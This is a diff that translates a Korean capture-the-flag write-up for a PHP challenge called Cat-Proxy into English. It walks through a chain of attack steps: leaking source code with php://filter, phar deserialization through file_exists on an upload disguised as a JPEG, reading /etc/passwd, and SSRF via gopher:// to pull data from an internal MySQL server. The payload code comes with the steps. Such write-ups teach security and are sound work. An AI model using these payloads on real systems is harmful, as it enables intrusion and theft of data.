@@ -14,17 +14,11 @@ Author: @shpik
 
 <https://www.youtube.com/watch?v=wZZ7oFKsKzY>
 
-[\*] Notice 1: bug fixed - upload error and server setting
-
-[\*] ~~Notice 2: SORRY, This problem is under constructor. wait a minutes.~~ - **Fix**
-
-[\*] Notice 3: Unintended solution patch. check please.
-
 Server Info: <http://web2.tendollar.kr:8100/>
 
 ## Exploit
 
-It have 3 menu in problem page
+It have 3 menu in this site.
 
 - Home
 - Login
@@ -35,19 +29,17 @@ First, sign in at join page, then you show additional 2 menu.
 - Nyaa
 - Profile
 
-nyaa페이지에서 URL입력하면 입력한 페이지를 nyaaa라는 페이지에서 화면에 출력해줍니다.
-
 Input url in nyaa page and the page you inputed will be displayed on the screen in nyaaa page.
 
-Profile 페이지에서는 이미지를 업로드하면 업로드된 이미지로 Avatar가 변하는 것 같습니다.
+If you upload to image in Profile page, then will be change your avatar to uploaded image.
 
 
 
-.php파일을 업로드 해보았지만 확장자가 jpg, jpeg, gif, png인 파일이 아니면 업로드가 안되는 모양입니다.
+I have uploaded a .php file but it seems that it can not be uploaded unless the extension is jpg, jpeg, gif, png.
 
-이 문제는 p파라미터를 통해 페이지를 처리합니다.
+This site handles the page through the p parameter.
 
-p 파라미터에 php wrapper를 써서 소스코드를 릭할 수 있습니다.
+You can leak the source code using a php wrapper to p parameter.
 
 `http://web2.tendollar.kr:8100/?p=php://filter/convert.base64-encode/resource=index`
 
@@ -71,7 +63,7 @@ p 파라미터에 php wrapper를 써서 소스코드를 릭할 수 있습니다.
 ?>
 ```
 
-config.php와 lib.php의 소스코드를 Leak합니다.
+Leaks config.php and lib.php source code.
 
 ```html
 <!-- config.php -->
@@ -107,15 +99,15 @@ config.php와 lib.php의 소스코드를 Leak합니다.
 ?>
 ```
 
-config.php는 database 접속에 대한 정보가 들어있습니다만, 패스워드가 없는 것을 알 수 있습니다.
+config.php contains information about the database connection, but it does not have a password.
 
-lib.php에는 Requests 클래스가 선언되어 있습니다.
+`Requests` class is declared in lib.php.
 
-이 클래스는 선언할 때 입력받은 url을 기반으로 curl을 수행합니다.
+This class executes curl based on the url you entered when declaring it.
 
-또 하나 눈여겨 봐야할 코드는 `ini_set('phar.readonly',0);`, phar.readonly옵션이 False로 설정되어 있습니다.
+The important code is `ini_set ('phar.readonly', 0);` with the phar.readonly option set to False.
 
-nyaa와 nyaaa페이지를 Leak 하였습니다.
+Leaks nyaa.php and nyaaa.php source code.
 
 ```html
 <!-- nyaa.php -->
@@ -153,11 +145,11 @@ nyaa와 nyaaa페이지를 Leak 하였습니다.
 </div>
 ```
 
-nyaaa.php에서는 Requests 클래스를 이용해 결과를 출력해줍니다.
+nyaaa.php prints the result of executing curl on inputed url.
 
-다만 입력값 url에 대한 필터링이 걸려있으므로, http, https외에는 요청할 수 없습니다.
+However, since the input value "url" is **filtered**, it can not be requested except *http* and *https*.
 
-다음으로 profile과 uploadThumb를 Leak합니다.
+Leaks profile.php and uploadThumb.php source code.
 
 ```html
 <!-- profile.php -->
@@ -226,21 +218,25 @@ nyaaa.php에서는 Requests 클래스를 이용해 결과를 출력해줍니다.
 ?>
 ```
 
-uploadThumb에서 업로드하려는 파일의 확장자를 검사하고, 파일이 존재하지 않을 경우 이미지 파일의 헤더부분을 체크하고 정상적일 경우 업로드를 수행합니다.
+uploadThumb.php checks *extension* of image file you want to upload, if same name does not exist, <u>checks header</u> of image file.
 
-여기서 취약점은 **file_exists**에 있습니다.
+then, image file is uploaded.
 
-**file_exists**는 phar wrapper가 들어갔을 때, phar안에 들어있는 metadata를 unserialize하여 공격이 발생합니다.
+Vulnerability exists on this page, and vulnerability is **file_exists** function.
 
-우리에게 주어진 class는 Requests 로써, **SSRF**(Server Side Request Forgery) 문제임을 짐작할 수 있습니다.
+**file_exists** function unserialize the Metadata contained in the phar file with phar wrapper. 
+
+(e.g. phar://test.phar)
+
+We can guess that the given <u>Requests class</u> is a **Server Side Request Forgery (SSRF)**.
 
 > **Unserialize using file function**
 >
-> file 관련 함수에 phar wrapper을 통해 metadata로 object가 들어가 있는 phar파일을 열면 unserialize가 발생합니다.
+> If you open <u>a phar file that contains objects as Metadata</u> through phar wrapper on file-related functions, unserialize occurs.
 >
 > e.g. file_exists("phar://shpik.phar");
 >
-> 이 취약점은 **file_exists** 뿐만 아래의 함수들에서 발생합니다.
+> This vulnerability occurs in the following functions, including **file_exists**:
 >
 > - include('phar://test.phar'); 
 > - file_get_contents('phar://test.phar'); 
@@ -269,7 +265,7 @@ uploadThumb에서 업로드하려는 파일의 확장자를 검사하고, 파일
 > - md5_file('phar://test.phar');
 > - and so on..
 
-우선 아래의 코드를 통해 phar을 생성해줍니다. 
+First, create phar file using below code.
 
 ```php
 ini_set('phar.readonly',0);
@@ -299,11 +295,13 @@ $phar->setMetadata($obj);
 $phar->stopBuffering();
 ```
 
-phar을 생성할 때 중요한 점은 <u>phar의 Metadata에 unserialize를 할 Object가 들어가야 합니다.</u>
+The important thing when creating phar file is that Metadata 
 
-여기서는 /etc/passwd를 요청하는 phar파일을 생성하였습니다.
+It must contain <u>Object to be unserialized</u>.
 
-이제 아래의 코드를 통해 file_exists시에 정상적으로 /etc/passwd가 열리는지 확인해봅니다.
+We have created phar file that read "/etc/passwd".
+
+Now, let's check if /etc/passwd is normally read in the **file_exists**.
 
 ```php
 ini_set('phar.readonly',0);
@@ -325,11 +323,11 @@ class Requests{
 file_exists("phar://phar.phar");
 ```
 
-phar://phar.phar을 인자로 주고 **file_exists** 함수를 실행하면 아래와 같이 Unserialize되어 /etc/passwd가 읽혀졌습니다.
-
 ![](/Users/osehun/Git-CTF/my_prob/Cat-Proxy/img1.png)
 
-하지만 업로드할 수 있는 파일은 jpg, jpeg, gif, png입니다.
+Successfully read!!!
+
+However, image file we can upload are jpg, jpeg, gif, png.
 
 ```php
 // in uploadThumbnail.php 
@@ -349,13 +347,13 @@ $allowExt = Array('jpg','jpeg','png','gif');
         }
 ```
 
-다행이도 phar의 경우 확장자는 상관이 없이 phar wrapper를 통해 열 수 있습니다.
+Fortunately phar is not sensitive to extensions.
 
 ```php
 file_exists("phar://phar.jpg");
 ```
 
-이제 남은건 확장자에 맞는 헤더를 맞춰주는 것이다.
+Now you need to match the header.
 
 ```php
 if($ext=="jpg"){
@@ -371,13 +369,13 @@ if($ext=="jpg"){
 }
 ```
 
-이를 만들기 위해서 phar을 tar형태로 만들엇습니다.
+To make it, I made phar into tar format.
 
-tar의 경우 파일의 이름이 앞에 100byte 나오고 그 뒤에 데이터가 들어가기 때문에 앞부분을 마음대로 조작할 수 있습니다.
+In the case of tar, name of file can be change freely.
 
-다만, tar의 헤더를 변경할 때 checksum또한 계산하여 변경해주어야합니다.
+However, when changing the header of tar, checksum should also be calculated and changed.
 
-우선 아래의 코드를 이용해 phar데이터를 tar로 만들었습니다.
+I used to make the phar data tar using below code.
 
 ```php
 ini_set('phar.readonly',0);
@@ -403,19 +401,17 @@ $obj = new Requests('file:///etc/passwd');
 $phar->setMetadata($obj);
 ```
 
-생성된 파일을 `file_exists("phar://test.tar");` 하게되면 /etc/passwd가 읽혀집니다.
-
-test.tar의 앞 부분의 헥스값은 다음과 같습니다.
+The hex value of generated test.tar is as follows.
 
 ![](/Users/osehun/Git-CTF/my_prob/Cat-Proxy/img2.png)
 
-앞부분에는 `$phar["AAABshpik"] = "FLAGFLAGFLAG";` 을 통해 넣었던 데이터가 들어있습니다.
+The first part contains the data you put through `$phar["AAABshpik"] = "FLAGFLAGFLAG";`.
 
-이제 "AAABshpik"에서 AAA를 jpg를 업로드할 때 검사하는 헤더의 앞부분인 `\xFF\xD8\xFF` 으로 변경해야합니다.
+Now, in "AAABshpik", you should change AAA to "\ xFF \ xD8 \ xFF", which is the first part of the header that is checked when you upload jpg.
 
-앞서 말씀드렸다시피 checksum이 존재하기 때문에 이 값을 맞춰줘야 합니다.
+Next, you should change the checksum.
 
-아래의 코드를 통해 이름을 변경하고, checksum을 계산하여 넣어주었습니다.
+I changed the name through the code below, and calculated the checksum.
 
 ```python
 import sys
@@ -441,25 +437,29 @@ if __name__=="__main__":
 			f.write(new_data)
 ```
 
-이제 위 코드로 생성된 파일을 phar wrapper로 열기위해 우선 서버에 업로드합니다. 
+Now upload the file generated by the above code to the server.
 
-저는 shpik_etcpasswd.jpg의 이름을 사용하였습니다.
+**filename :** shpik_etcpasswd.jpg
 
-그 후 phar://shpik_etcpasswd.jpg를 업로드 해야하는데, file_exists안에 urldecode가 있으므로 아래와 같은 파일을 업로드 하였습니다.
+Then phar://shpik_etcpasswd.jpg should be uploaded. 
+
+But there is urldecode funtion in file_exists function, we uploaded "phar%3a%2f%2fshpik_etcpasswd.jpg".
 
 **filename :** phar%3a%2f%2fshpik_etcpasswd.jpg
 
 ![](/Users/osehun/Git-CTF/my_prob/Cat-Proxy/img3.png)
 
-/etc/passwd가 정상적으로 읽힌 것을 볼 수있습니다.
+You have successfully read /etc/passwd.
 
-만약 flag가 파일로 존재할 경우 우리가 가지고 있는 취약점을 이용해서는 파일 이름을 알아낼 수가 없으므로, database안에 있을꺼라 생각합니다.
+If the flag exists as a file, we can not find the file name using this vulnerability.
 
-database는 mysql로써, 패스워드가 존재하지 않습니다.
+So I think it will be in the database.
 
-그러면 gopher wrapper을 이용해 mysql에 접속하여 데이터를 추출합니다.
+database is mysql and password does not set(null).
 
-gopher을 통해 mysql의 데이터를 추출하기 위해 raw socket을 이용해야하며, 제가 사용한 코드는 아래와 같습니다.
+Connect to mysql and extract data using **gopher wrapper**!
+
+I use below code made mysql raw socket.
 
 ```python
 import struct
@@ -502,7 +502,7 @@ gopher://catproxy_db_1:3306/_%9d%00%00%01%85%a2%1e%00%00%00%00%40%08%00%00%00%00
 '''
 ```
 
-위에서 얻은 url로 object를 생성해줍니다.
+I create tar using url containing gopher wapper and mysql raw socket.
 
 ```php
 $phar = new PharData("get_tables.tar");
@@ -511,7 +511,7 @@ $obj = new Requests('gopher://catproxy_db_1:3306/_%9d%00%00%01%85%a2%1e%00%00%00
 $phar->setMetadata($obj);
 ```
 
-여기서 생성된 phar 파일을 헤더를 `\xFF\xD8\xFF` 로 변경하고 .jpg로 확장자를 바꿔서 업로드 해준 후 phar wrapper를 통해 서버에 요청하면 mysql에서 table list를 볼 수 있습니다. ( shpik_tables.jpg )
+Now, in "AAABshpik", you should change AAA to "\ xFF \ xD8 \ xFF",  and upload this file to the server.
 
 **filename :** phar%3a%2f%2fshpik_tables.jpg
 
@@ -563,9 +563,9 @@ BASE TABLEInnoDB10Dynamic0016384000?2018-11-24 03:42:04嬅latin1_swedi
 BASE TABLEInnoDB10Dynamic4239016384000?2018-11-24 03:42:042018-11-28 12:08:36?latin1_swedish_ci?    ?  " </div>
 ```
 
-cat이라는 database안에 flag, user라는 테이블이 있는 것을 볼 수 있습니다.
+You can see that there are flag and user in cat.
 
-이제 select * from cat.flag를 실행하는 phar파일을 생성하여 서버에 업로드 하면 flag를 얻을 수 있습니다.
+Now you can create a phar file that executes "select * from cat.flag" and upload it to the server to get the flag.
 
 ![](/Users/osehun/Git-CTF/my_prob/Cat-Proxy/img4.png)
 
